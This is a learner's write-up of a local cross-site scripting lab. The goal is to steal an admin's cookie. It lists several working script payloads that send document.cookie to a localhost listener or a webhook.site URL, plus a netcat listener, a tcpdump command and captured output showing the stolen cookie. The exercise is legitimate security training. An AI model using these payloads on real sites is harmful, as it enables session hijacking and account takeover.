# SETUP
* http://localhost/labs/x0x03.php      #xss
* Container 1 goes to 
	* http://localhost/labs/x0x03.php
* Container 2 goes to 
	* http://localhost/labs/x0x03_admin.php
* 
* Try to steal / EXFIL admin's cookie!
* can use netcat to listen locally
* * or use webhook.site 
* from container 1, we want to configure a payload
* from container 2, we want to trigger payload
	* Triggered payload should exfil ADMIN cookie
## PAYLOAD
* started by testing for HTML injection
	* HTML Injection was successful
```js
<h1>jim</h1>
```
* I think we need to combine the DOM and the STORED labs together in a way
* We need the redirection from DOM lab, along with the cookie stealing from stored lab
```shell
# Simple, WORKED
<script>document.location='http://127.0.0.1:8000/?'+document.cookie
</script>

# Official answer, worked
<script>var i=new Image;i.src="http://127.0.0.1:8000/?"+document.cookie; </script>

# Worked
<script>
fetch('http://127.0.0.1:8000/bogus.php?output=', {
method: 'POST',
mode: 'no-cors', 
body:document.cookie }); 
</script>

# Worked
<script>
fetch('https://webhook.site/7d79fb71-1ce5-4e3e-80b7-0f258a466ff8', {
method: 'POST',
mode: 'no-cors', 
body:document.cookie }); 
</script>
```
#### LISTENER
```shell
nc -nvlp 8000
```

* output in tcpdump to analyze in wireshark later
```shell
sudo tcpdump -i lo port 8000 -w tcp8000.pcap 
```

* had trouble  getting the output format in nc to work properly
* Burpsuite PRO can use the collaborator tool to catch the cookie.
* 3rd method was to use the webook.site 
## webhook.site
* https://webhook.site/
* Gives you unique URL to use in your payload.
* this was succesful

#### PHP output from : PHP Payload
```shell
[sudo] password for kali: 
listening on [any] 8000 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 49654


GET /?admin_cookie=5ac5355b84894ede056ab81b324c4675 HTTP/1.1
Host: 127.0.0.1:8000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
```

## Official Walkthrough
```shell
<script>var i=new Image;i.src="http://127.0.0.1:8000/?"+document.cookie; </script>
```

## References 
* https://community.f5.com/kb/technicalarticles/cross-site-scripting-xss-exploit-paths/275166
* https://portswigger.net/web-security/cross-site-scripting/exploiting/lab-stealing-cookies
* https://webhook.site/
* https://github.com/Al0nnso/P3NTEST/blob/master/BUG%20BOUNTY/VULNERABILITIES/XSS.md
